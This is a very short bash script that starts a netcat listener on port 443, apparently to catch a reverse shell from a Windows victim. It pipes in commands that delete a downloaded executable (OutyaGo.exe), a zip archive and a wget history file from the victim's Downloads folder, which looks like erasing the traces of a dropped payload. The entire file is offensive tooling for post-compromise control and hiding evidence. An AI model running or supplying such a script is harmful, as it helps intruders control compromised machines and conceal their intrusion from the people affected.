#!/bin/bash

rlwrap nc -nlvp 443 <<EOF 

del "C:\Users\%USERNAME%\Downloads\.wget-hsts"
del "C:\Users\%USERNAME%\Downloads\OutyaGo.exe"
del "C:\Users\%USERNAME%\Downloads\bajar.zip"

EOF
